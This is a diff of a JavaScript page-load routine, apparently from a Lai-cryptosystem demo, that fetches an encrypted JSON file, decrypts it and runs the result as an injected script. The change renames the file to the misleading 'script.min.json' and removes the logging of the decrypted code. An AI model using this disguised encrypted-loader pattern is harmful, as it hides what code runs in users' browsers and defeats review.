@@ -721,20 +721,18 @@ recovered = decrypt(C1, C2, private_k, a, p)
   window.addEventListener("load", async () => {
       try {
         // 2.1. Ambil file JSON dari server (atau local)
-        const response = await fetch("hello_ciphertext.json");
+        const response = await fetch("script.min.json");
         if (!response.ok) {
-          throw new Error(`HTTP ${response.status} saat fetch ciphertext.json`);
+          throw new Error(`HTTP ${response.status} saat fetch script.min.json`);
         }
         const laiData = await response.json();
 
-        console.log("=== Lai Data (dari hello_ciphertext.json) ===");
+        console.log("=== Lai Data (dari script.min.json) ===");
         console.log(laiData);
 
         // 2.2. Panggil decrypt_all_text_js() dari decryptor.js
         const decryptedJS = await decrypt_all_text_js(laiData);
-        console.log("=== Decrypted JS Code ===");
-        console.log(decryptedJS);
-
+        
         // 2.3. Sisipkan hasil dekripsi sebagai <script> baru agar browser menjalankannya
         const scriptEl = document.createElement("script");
         scriptEl.type = "application/javascript";
